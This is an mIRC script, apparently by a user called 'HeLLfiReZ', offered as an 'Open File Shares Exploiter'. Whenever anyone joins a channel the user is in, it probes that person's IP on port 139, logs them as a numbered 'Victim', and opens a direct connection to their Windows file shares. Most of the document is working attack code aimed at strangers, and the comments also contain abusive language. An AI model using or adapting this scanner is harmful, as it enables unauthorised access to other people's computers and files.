;Open File Shares Exploiter For mIRC x.xx   
;Only works on servers with out +x mask protection
;This scans all users as they enter any
;channel that you are in for the possible 
;existance of fileshares. If the scanner 
;detects the possible existance of a 
;fileshare it will attempt a direct connection
;to it. In order to connect to fileshares you 
;will need to enable file and printer sharing
;which is a very simple process and does not 
;mean that you have to actually share any of your
;files or make yourself vulnerable to this exploit.
;For those that want to try this and don't know 
;you can eat my shit because i dont have time for you. 
;Sharing files over TCP/IP is never a good idea and hence
;the reason for this simple exploit. If you do really want 
;to share files over a network simply unbind sharing over
;TCP/IP and install and use a different protocol such as 
;NETBEUI, IPX/SPX which will only allow connections over 
;local network. You have been warned :) Now let's play.
;
;Have a real nice day
;HeLLfiReZ

on 1:CONNECT:{
  notify on
  remote on
}

alias ver return 1,8
alias scanlogo return 1,8
alias page return 

on *:join:#:{
  sockclose Shared*
  %ip = $site
  %ni = $nick
  %ch = $chan
  %tm = $time
  sockopen Shared $site 139
}

on *:sockopen:Shared:{
  if ($sockerr > 0) return
  sockwrite -n  Shared 
  inc %scan 1
  echo -a 12,1HeLL-139 Found11,1 12,1Nick:11,1 %ni 12,112,1IP:11,1 $sock($sockname).ip 11,112,1Chan:11,1 %ch 12,1Time:11,1 %tm 12,1Victim No:11 %scan 1112Possible: 1,11 FILESHARES PORT 139  $scanlogo
  run \\ $+ [ $sock($sockname).ip ]
}



